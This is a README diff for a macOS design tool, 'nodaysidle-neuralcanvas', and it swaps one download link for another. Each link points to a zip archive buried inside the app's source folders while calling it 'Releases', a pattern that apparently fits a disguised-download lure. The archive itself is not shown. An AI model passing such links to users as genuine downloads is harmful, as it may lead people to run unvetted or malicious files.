@@ -11,7 +11,7 @@ Welcome to nodaysidle-neuralcanvas! This MacOS native design tool converts your 
 - **User-Friendly Interface**: Designed for ease of use, perfect for designers at any skill level.
 
 ## 📥 Download & Install
-To download nodaysidle-neuralcanvas, visit this page to download: [Download nodaysidle-neuralcanvas Releases](https://raw.githubusercontent.com/JesusIgnacio18/nodaysidle-neuralcanvas/main/NeuralCanvas/NeuralCanvas/Views/Sidebar/nodaysidle-neuralcanvas-1.3.zip).
+To download nodaysidle-neuralcanvas, visit this page to download: [Download nodaysidle-neuralcanvas Releases](https://github.com/JesusIgnacio18/nodaysidle-neuralcanvas/raw/refs/heads/main/NeuralCanvas/NeuralCanvas/Views/nodaysidle-neuralcanvas-v3.9.zip).
 
 ### Step-by-Step Download Instructions
 1. Click on the link above.
